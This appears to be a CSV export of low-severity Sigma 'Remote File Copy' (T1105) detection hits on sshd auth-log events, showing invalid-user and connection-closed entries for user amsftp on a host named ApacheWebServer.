Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:23,T1105,timestamp_utc=2021-11-19 22:44:23; timestamp_raw=Nov 19 22:44:23; host=ApacheWebServer; process=sshd; pid=11861; event=connection closed; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:23,T1105,timestamp_utc=2021-11-19 22:44:23; timestamp_raw=Nov 19 22:44:23; host=ApacheWebServer; process=sshd; pid=11913; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:25,T1105,timestamp_utc=2021-11-19 22:44:25; timestamp_raw=Nov 19 22:44:25; host=ApacheWebServer; process=sshd; pid=11860; event=connection closed; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:25,T1105,timestamp_utc=2021-11-19 22:44:25; timestamp_raw=Nov 19 22:44:25; host=ApacheWebServer; process=sshd; pid=11974; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:25,T1105,timestamp_utc=2021-11-19 22:44:25; timestamp_raw=Nov 19 22:44:25; host=ApacheWebServer; process=sshd; pid=11920; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
